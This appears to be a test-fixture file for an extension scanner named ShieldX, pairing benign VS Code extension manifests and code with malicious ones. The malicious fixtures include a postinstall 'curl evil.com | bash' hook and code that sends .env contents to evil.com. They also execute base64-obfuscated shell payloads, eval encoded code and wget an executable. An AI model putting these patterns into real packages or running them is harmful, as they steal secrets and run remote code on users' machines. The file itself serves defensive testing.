export const maliciousExtensionPkg = {
  name: 'test-malicious-extension',
  displayName: 'Test Malicious Extension',
  publisher: 'test-malicious',
  version: '1.0.0',
  description: 'A test extension with malicious patterns for ShieldX testing',
  license: 'MIT',
  repository: { type: 'git', url: 'https://github.com/test/malicious' },
  activationEvents: ['onStartupFinished', 'workspaceContains:.env'],
  main: './extension.js',
  scripts: {
    postinstall: 'node install.js && curl http://evil.com/setup.sh | bash',
  },
  contributes: {
    commands: [
      { command: 'test.uploadData', title: 'Upload Data' },
      { command: 'test.executeRemote', title: 'Execute Remote' },
    ],
  },
  dependencies: {
    axios: '0.18.0',
    lodash: '4.17.19',
    'node-fetch': '2.6.1',
  },
};

export const benignExtensionPkg = {
  name: 'test-benign-extension',
  displayName: 'Test Benign Extension',
  publisher: 'vscode',
  version: '2.5.0',
  description: 'A safe test extension for ShieldX testing',
  license: 'MIT',
  repository: { type: 'git', url: 'https://github.com/benign/safe-ext' },
  activationEvents: ['onCommand:test.safeCommand'],
  main: './out/extension.js',
  contributes: {
    commands: [{ command: 'test.safeCommand', title: 'Safe Command' }],
    themes: [{ label: 'Test Theme', uiTheme: 'vs-dark', path: './theme.json' }],
  },
  dependencies: {
    lodash: '4.17.21',
    semver: '7.6.0',
  },
};

export const maliciousExtensionCode = `// Test malicious extension code
const cp = require('child_process');
const fs = require('fs');
const https = require('https');

function activate(context) {
  // Read .env and exfiltrate
  const envContent = fs.readFileSync('.env', 'utf8');
  https.request({ hostname: 'evil.com', path: '/steal?d=' + Buffer.from(envContent).toString('base64') });

  // Execute shell commands
  cp.exec('curl http://evil.com/payload.sh | bash');

  // Decode obfuscated payload
  const payload = atob('cHdkIDsgY3VybCAtbyAtIGh0dHA6Ly9ldmlsLmNvbS9wYXlsb2FkLnNoIHwgYmFzaA==');
  cp.execSync(payload);

  // Eval remote code
  eval(atob('Y29uc29sZS5sb2coIm1hbGljaW91cyIp'));

  // Install script
  const installUrl = 'http://192.168.1.1/download.exe';
  cp.exec('wget ' + installUrl + ' -O /tmp/installer');
}

exports.activate = activate;
exports.deactivate = function() {};
`;

export const benignExtensionCode = `// Test benign extension code
const vscode = require('vscode');

function activate(context) {
  context.subscriptions.push(
    vscode.commands.registerCommand('test.safeCommand', () => {
      vscode.window.showInformationMessage('Hello from safe extension!');
    })
  );

  context.subscriptions.push(
    vscode.workspace.onDidChangeConfiguration(() => {
      // React to config changes
    })
  );
}

exports.activate = activate;
exports.deactivate = function() {};
`;
